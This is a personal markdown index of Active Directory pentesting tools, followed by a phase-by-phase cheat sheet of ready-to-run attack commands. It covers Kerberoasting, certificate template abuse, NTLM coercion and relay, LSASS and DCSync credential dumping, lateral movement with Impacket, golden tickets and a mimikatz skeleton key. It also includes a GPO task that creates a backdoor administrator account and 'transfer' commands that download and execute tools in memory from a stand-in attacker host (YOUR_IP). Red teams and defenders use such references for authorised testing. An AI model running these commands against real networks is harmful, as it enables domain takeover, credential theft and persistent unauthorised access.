---
tags: [index, activedirectory, moc]
---

# Active Directory Tools Index

## Quick Navigation

| Category | Tools | Use Case |
|----------|-------|----------|
| Enumeration | 15+ tools | AD recon, user/group discovery |
| Kerberos Attacks | 8+ tools | Ticket abuse, roasting |
| Certificate Abuse | 6+ tools | AD CS exploitation |
| Credential Dumping | 7+ tools | Hash extraction, LSASS |
| Relay & Coercion | 8+ tools | Authentication relay |
| Post-Exploitation | 10+ tools | Lateral movement |
| ACL Abuse | 5+ tools | Permission exploitation |
| GPO Abuse | 4+ tools | Group Policy attacks |
| Vulnerability Scanning | 8+ tools | AD vuln assessment |
| Windows Binaries | 15+ tools | Compiled .exe tools |
| PowerShell Scripts | 10+ tools | PowerShell modules |

---

## Core AD Tools (Kali Repo)

- bloodhound - AD visualization and attack path analysis
- bloodhound-python - BloodHound data collector for Linux
- certipy-ad - AD CS attack toolkit
- crackmapexec - Swiss Army knife for AD pentesting
- netexec - Modern fork of crackmapexec
- enum4linux-ng - Windows/Samba enumeration
- python3-ldapdomaindump - LDAP domain dumper
- kerberoast - Kerberos service account attacks
- impacket-scripts - Python network protocols
- powersploit - PowerShell post-exploitation framework
- nishang - PowerShell offensive security framework
- mimikatz - Windows credential dumper
- responder - LLMNR/NBT-NS/mDNS poisoner
- smbmap - SMB share mapper
- smbclient - SMB client
- neo4j - Graph database for BloodHound
- bloodyad - ACL abuse tool
- spraykatz - Credential spraying tool
- crowbar - Brute force tool

## Windows Binaries (Ghostpack Collection)

- Rubeus.exe - Kerberos abuse toolkit
- Certify.exe - AD CS enumeration/abuse
- Seatbelt.exe - Windows host enumeration
- SharpUp.exe - Windows privilege escalation checks
- SharpHound.exe - BloodHound data collector
- SharpGPOAbuse.exe - GPO exploitation
- SharpDPAPI.exe - DPAPI abuse
- SharpRoast.exe - Kerberoasting tool
- SharpView.exe - .NET port of PowerView
- ADCollector.exe - AD enumeration
- SharpLAPS.exe - LAPS password reader
- Group3r.exe - GPO enumeration
- Grouper2.exe - GPO analysis
- ADExplorer.exe - Sysinternals AD viewer
- PingCastle.exe - AD security assessment
- PurpleKnight.exe - AD security assessment

## PowerShell Scripts

- PowerView.ps1 - AD enumeration (PowerSploit)
- Powermad.ps1 - Machine account manipulation
- SharpHound.ps1 - PowerShell BloodHound collector
- ADModule - Microsoft AD PowerShell module
- ACLight.ps1 - ACL analysis
- ADACLScanner.ps1 - ACL scanning

## Dirk-jan's Tools

- krbrelayx - Kerberos relay attacks
- PKINITtools - PKINIT abuse
- adidnsdump - Active Directory DNS enumeration

## Coercion Tools

- Coercer - Authentication coercion framework
- PetitPotam - MS-EFSR coercion
- DFSCoerce - DFS coercion
- ShadowCoerce - Shadow copy coercion

## Kerberos & Certificate Abuse

- targetedKerberoast - Targeted Kerberoasting
- pywhisker - Shadow credentials attack
- Delegate-Your-Cert - ESC4 automation
- kerbrute - Kerberos bruteforce/enum
- pypykatz - Python Mimikatz

## Credential Dumping

- DonPAPI - DPAPI credential dumper
- nanodump - LSASS minidump
- lsassy - Remote LSASS dump
- pypykatz - Python Mimikatz

## ACL Abuse

- aclpwn - ACL attack path exploitation
- bloodyad - ACL abuse toolkit
- ACLight - ACL analysis
- ADACLScanner - ACL scanning

## Vulnerability Exploitation

- CVE-2020-1472 - ZeroLogon checker
- noPac - CVE-2021-42278/42287
- CVE-2021-1675 - PrintNightmare
- sam-the-admin - CVE-2021-42278
- MS17-010 - EternalBlue

## Additional Enumeration

- linWinPwn - Automated AD enum framework
- windapsearch - LDAP search tool
- silenthound - Stealthy AD enum
- pre2k - Pre-Windows 2000 account checker
- AD-miner - AD visualization
- DCOMrade - DCOM enumeration

## LAPS Tools

- PyLAPS - LAPS password reader
- SharpLAPS.exe - Windows LAPS reader

---

## Quick Reference by Attack Phase

### Phase 1: Initial Enumeration

# From Linux
bloodhound-python -d domain.local -u user -p pass -ns dc -c All
enum4linux-ng -A target.com
ldapdomaindump ldaps://dc.domain.local -u 'DOMAIN\user' -p 'pass'
windapsearch -d domain.local -u user@domain.local -p pass --dc dc.domain.local -m users

# From Windows (PowerShell)
Import-Module .\PowerView.ps1
Get-DomainUser | select samaccountname
Get-DomainComputer | select dnshostname
Get-DomainGroupMember -Identity "Domain Admins"

# From Windows (Binary)
SharpHound.exe -c All
Seatbelt.exe -group=all

### Phase 2: Kerberos Attacks

# Kerberoasting
GetUserSPNs.py domain.local/user:pass -dc-ip dc -request
Rubeus.exe kerberoast /outfile:hashes.txt
targetedKerberoast.py -d domain.local -u user -p pass -usersfile users.txt

# AS-REP Roasting
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip dc
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Pass the Ticket
Rubeus.exe ptt /ticket:ticket.kirbi

# Golden/Silver Tickets
ticketer.py -nthash krbtgt-hash -domain-sid S-1-5-21-... -domain domain.local admin
Rubeus.exe golden /krbkey:krbtgt-hash /user:Administrator /domain:domain.local /sid:S-1-5-21-...

### Phase 3: Certificate Abuse

# Find vulnerable templates
certipy find -u user@domain.local -p pass -dc-ip dc
Certify.exe find /vulnerable

# Request certificate
certipy req -u user@domain.local -p pass -ca CA-SERVER -template VulnTemplate -target dc.domain.local
Certify.exe request /ca:dc.domain.local\CA-NAME /template:VulnerableTemplate

# Shadow credentials
pywhisker.py -d domain.local -u user -p pass -t target-user --action add

### Phase 4: Coercion & Relay

# Setup relay first
ntlmrelayx.py -t ldap://dc.domain.local -smb2support --delegate-access

# Coerce authentication
petitpotam.py attacker-ip dc-ip
printerbug.py domain/user:pass@dc-ip attacker-ip
Coercer -d domain.local -u user -p pass --target dc-ip --listener attacker-ip

# Responder
sudo responder -I eth0 -rdw

### Phase 5: Credential Dumping

# Remote LSASS
lsassy -d domain.local -u user -H hash target
secretsdump.py domain/user:pass@dc -just-dc

# On target (Windows)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
Rubeus.exe dump
DonPAPI domain/user:pass@target

### Phase 6: Lateral Movement

# Impacket scripts
psexec.py domain/user:pass@target
wmiexec.py domain/user:pass@target
smbexec.py domain/user:pass@target
atexec.py domain/user:pass@target "whoami"

# NetExec
netexec smb target -u user -p pass -x whoami
netexec smb target -u user -H hash --wmi whoami

# Evil-WinRM
evil-winrm -i target -u user -p pass

### Phase 7: ACL Abuse

# Check ACLs
bloodyAD --host dc.domain.local -d domain.local -u user -p pass get object Users --attr nTSecurityDescriptor
aclpwn -f user -t "Domain Admins" -d domain.local

# Modify ACLs
dacledit.py domain.local/user:pass -dc-ip dc -principal user -target "Domain Admins" -rights DCSync

### Phase 8: GPO Abuse

# Find vulnerable GPOs
SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c net user hacker Password123! /add && net localgroup administrators hacker /add" --GPOName "Default Domain Policy"

# GPO enumeration
Group3r.exe
Grouper2.exe

### Phase 9: Domain Compromise

# DCSync
secretsdump.py -just-dc domain.local/admin@dc

# Golden Ticket
ticketer.py -nthash krbtgt-hash -domain-sid S-1-5-21-... -domain domain.local admin
export KRB5CCNAME=admin.ccache
psexec.py domain.local/admin@dc -k -no-pass

# Skeleton Key (mimikatz)
mimikatz "privilege::debug" "misc::skeleton"

## Quick Transfer Commands

### Serve Windows Binaries
cd ~/tools/activedirectory/windows && python3 -m http.server 8000
certutil -urlcache -f http://YOUR_IP:8000/Rubeus.exe Rubeus.exe
certutil -urlcache -f http://YOUR_IP:8000/Certify.exe Certify.exe

### Serve PowerShell Scripts
cd ~/tools/activedirectory/windows && python3 -m http.server 8000
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/PowerView.ps1')"

## Notes

- Windows binaries need to be run on Windows targets
- PowerShell scripts need `powershell -ep bypass` to execute
- Many Python tools require valid credentials
- Always check privileges before running attacks (`whoami /priv`)
- BloodHound requires Neo4j running (`sudo neo4j console`)
- Impacket tools are in `~/.local/bin/` after pipx install
- Ghostpack binaries are pre-compiled and ready to use
